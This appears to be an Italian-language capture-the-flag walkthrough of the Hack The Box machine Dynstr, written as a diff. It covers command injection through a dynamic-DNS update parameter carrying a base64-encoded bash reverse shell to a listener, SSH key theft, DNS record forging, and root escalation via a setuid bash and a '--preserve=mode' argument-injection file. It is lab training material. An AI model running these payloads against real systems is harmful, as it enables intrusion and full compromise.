@@ -1,0 +1,103 @@
+---------------------------------------------------------------------------------------------------------------
+nmap -A -Pn -n -vvv 10.10.10.244
+
+---------------------------------------------------------------------------------------------------------------
+Creiamo il record nel file degli host name 
+sudo echo "10.10.10.244  dynamicdns.htb no-ip.htb dynstr.htb beta.dyna.htb" >> /etc/hosts
+
+---------------------------------------------------------------------------------------------------------------
+Effettuiamo una scansione con dirb 
+dirb http://10.10.10.244 -w /usr/share/wordlists/dirb/common.txt
+
+Troviamo qualche cartella importante, sopratutto il path nic/update.
+Proviamo a entrare e otteniamo una badauth
+
+---------------------------------------------------------------------------------------------------------------
+Cerchiamo su google e troviamo qualcosa di interessante
+https://www.noip.com/integrate/request
+https://www.dynu.com/Forum/ViewTopic/badauth-being-received/439
+---------------------------------------------------------------------------------------------------------------
+Facciamo qualche tentativo di chiamata
+curl "http://dyna.htb/nic/update?myip=10.10.14.36&hostname=dyna.htb" -H "Authorization: Basic ZHluYWRuczpzbmRhbnlk"
+curl "http://dyna.htb/nic/update?myip=10.10.14.36&hostname=no-ip.htb" -H "Authorization: Basic ZHluYWRuczpzbmRhbnlk"
+
+Ma riceviamo sempre un messaggio "911 [wrongdom: htb]".
+
+Proviamo qualche combinazione fino a trovare qualcosa di interessante
+
+curl "http://dyna.htb/nic/update?myip=10.10.14.36&hostname=dynamicdns.no-ip.htb" -H "Authorization: Basic ZHluYWRuczpzbmRhbnlk"
+Messaggio positivo -> good: 10.10.14.36
+
+Proviamo a manipolare un po' i dati. Aggiungiamo un ; prima dell'hostname
+
+curl "http://dyna.htb/nic/update?myip=10.10.14.36&hostname=;dynamicdns.no-ip.htb" -H "Authorization: Basic ZHluYWRuczpzbmRhbnlk"
+
+Otteniamo "911 [nsupdate failed]"
+
+Cerchiamo su internet e troviamo la seguente "https://linux.die.net/man/8/nsupdate"
+
+---------------------------------------------------------------------------------------------------------------
+echo "bash -i &>/dev/tcp/10.10.14.36/1234 <&1"| base64
+
+Base64 encode/decode
+`echo YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjM2LzEyMzQgPCYxCg==| base64 -d | bash` ->
+%60echo%20YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjM2LzEyMzQgPCYxCg%3D%3D%7C%20base64%20-d%20%7C%20bash%60
+
+nc -nlvp 1234
+curl "http://dyna.htb/nic/update?myip=10.10.14.36&hostname=%60echo%20YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjM2LzEyMzQgPCYxCg%3D%3D%7C%20base64%20-d%20%7C%20bash%60dnsalias.no-ip.htb" -H "Authorization: Basic ZHluYWRuczpzbmRhbnlk"
+
+Otteniamo la shell
+---------------------------------------------------------------------------------------------------------------
+cd /home -> ls -la -> Troviamo 2 utenti 
+---------------------------------------------------------------------------------------------------------------
+Iniziamo ad indagare sul primo utente bindmgr.
+Troviamo qualcosa di interessante nella cartella "support-case-C627" e nel file "strace-C62796521.txt".
+Sbirciando nel file, troviamo una chiave per collegarci tramite ssh.
+Prima di poter utilizzare la chiave per accedere con ssh, dobbiamo però creare un record DNS
+---------------------------------------------------------------------------------------------------------------
+update add api.infra.dyna.htb 86400 A 10.10.16.104
+update add 104.16.10.10.in-addr.arpa 86400 PTR api.infra.dyna.htb
+show
+
+Però otteniamo un errore -> "update failed: NOTZONE".
+Cerchiamo su google, ma il problema è di facile risoluzione, basta aggiungere una riga vuota tra i due update
+---------------------------------------------------------------------------------------------------------------
+update add api.infra.dyna.htb 86400 A 10.10.16.104
+
+update add 104.16.10.10.in-addr.arpa 86400 PTR api.infra.dyna.htb
+show
+quit
+
+ssh -i id_rsa bindmgr@dyna.htb
+cat user.txt -> OTTENIAMO LA CHIAVE
+---------------------------------------------------------------------------------------------------------------
+sudo -l
+c'è un file eseguibile con i permessi di root "/usr/local/bin/bindmgr.sh"
+
+Lo analizziamo per capire cosa fa -> cat /usr/local/bin/bindmgr.sh
+---------------------------------------------------------------------------------------------------------------
+Il codice verifica l'esistenza di un file .version, quindi innanzitutto, lo creiamo.
+
+echo "2" > .version
+
+Una volta verificata l'esistenza del file .version, lo copierà nella cartella "/etc/bind/named.bindmgr/"
+---------------------------------------------------------------------------------------------------------------
+Tutti i file nella cartella dove era presente .version sono copiati nella cartella di proprietà del root.
+Quindi dobbiamo trovare un modo per sfruttare questa vulnerabilità. Potremmo far in modo di far copiare un binary bash ed eseguire lo script.
+
+cp /bin/bash .
+chmod +s bash
+echo "" > "--preserve=mode"
+ls -la
+sudo /usr/local/bin/bindmgr.sh
+/etc/bind/named.bindmgr/bash -p 
+
+BASH CON ROOT OTTENUTA. 
+---------------------------------------------------------------------------------------------------------------
+cd /root
+cat root.txt
+
+
+
+
+
